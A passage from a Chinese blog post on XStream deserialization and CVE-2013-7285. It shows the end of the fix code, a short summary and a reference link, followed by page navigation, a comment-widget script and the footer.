+    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ConversionException</span><span class="token punctuation">(</span><span class="token string">"Unsupported type due to security reasons."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">XStream</span><span class="token punctuation">.</span><span class="token constant">PRIORITY_LOW</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>XStream 最基础的漏洞是 CVE-2013-7285，通过这个漏洞可以很好的先认识 XStream 的基础运行流程，后续的漏洞挖掘和修复也算是一些《攻防史》，还是比较有意思的</p>
+<h2 id="0x05-Ref"><a href="#0x05-Ref" class="headerlink" title="0x05 Ref"></a>0x05 Ref</h2><p><a class="link"   target="_blank" rel="noopener" href="https://x-stream.github.io/CVE-2013-7285.html" >https://x-stream.github.io/CVE-2013-7285.html<i class="fas fa-external-link-alt"></i></a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">Java 反序列化之 XStream 反序列化-01</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2023-04-18 22:01:03</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2023/04/18/Java-反序列化之-XStream-反序列化-01/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Java/">#Java</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/04/20/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%85%AD%E5%A4%A7%E5%85%B3%E7%B3%BB/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">Java 设计模式之六大关系</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">浅谈 JEP290</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89"><span class="nav-text">Java 反序列化之 XStream 反序列化（一）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-XStream-%E5%9F%BA%E7%A1%80"><span class="nav-text">0x01 XStream 基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XStream-%E7%AE%80%E4%BB%8B"><span class="nav-text">XStream 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-XStream-%E5%AE%9E%E7%8E%B0%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">使用 XStream 实现序列化与反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XStream-%E5%87%A0%E4%B8%AA%E9%83%A8%E5%88%86"><span class="nav-text">XStream 几个部分</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MarshallingStrategy-%E7%BC%96%E7%A0%81%E7%AD%96%E7%95%A5"><span class="nav-text">MarshallingStrategy 编码策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Mapper-%E6%98%A0%E5%B0%84%E5%99%A8"><span class="nav-text">Mapper 映射器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Converter-%E8%BD%AC%E6%8D%A2%E5%99%A8"><span class="nav-text">Converter 转换器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EventHandler-%E7%B1%BB"><span class="nav-text">EventHandler 类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DynamicProxyConverter-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E8%BD%AC%E6%8D%A2%E5%99%A8"><span class="nav-text">DynamicProxyConverter 动态代理转换器</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-CVE-2013-7285"><span class="nav-text">0x02 CVE-2013-7285</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">0x03 漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x04 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Ref"><span class="nav-text">0x05 Ref</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
